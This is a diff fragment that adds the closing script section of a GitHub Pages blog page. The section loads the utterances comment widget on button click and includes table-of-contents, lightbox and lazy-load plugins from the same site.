+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
